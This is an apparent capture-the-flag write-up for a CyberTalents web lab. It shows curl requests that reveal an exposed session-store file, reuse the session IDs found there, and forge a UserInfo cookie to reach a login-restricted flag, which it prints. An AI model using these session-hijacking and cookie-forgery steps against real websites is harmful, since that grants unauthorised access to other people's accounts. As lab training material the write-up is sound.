Flag is restricted to logged users only , can you be one of them.

## solve
when i go into the website i have this one.
Welcome to sessions valley
You are not logged-in so you don't have any flag to view
Flag: NULL

i use curl
```
curl website
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>

```
I got a PHPsessionid so i will add it on my curl
```
└─# curl -H "cookie:PHPSESSID=" http://wlem14nzy24tnzkmkm73p97aqzqw5l3nqnlphq36-web.cybertalentslabs.com/ 
Session not found in data/session_store.txt    

```
here in my PHPSESSIONID. i left the session empty so i got a file.txt

```
http://wlem14nzy24tnzkmkm73p97aqzqw5l3nqnlphq36-web.cybertalentslabs.com/data/session_store.txt
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```
I got 3 session i will use them
```
└─# curl -H "cookie:PHPSESSID=ksjdlaskjd23ljd2lkjdkasdlk" http://wlem14nzy24tnzkmkm73p97aqzqw5l3nqnlphq36-web.cybertalentslabs.com/
UserInfo Cookie don't have the username , Validation failed    
```
When i try a cookie it's saying UserInfo cookie don't have username
so i will add it now
```
└─# curl -H "cookie:PHPSESSID=11l3ztdo96ritoitf9fr092ru3; UserInfo=mary" http://wlem14nzy24tnzkmkm73p97aqzqw5l3nqnlphq36-web.cybertalentslabs.com/
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are Loggedin</h2>
            <h3>Flag: sessionareawesomebutifitsecure</h3>
    </div>


```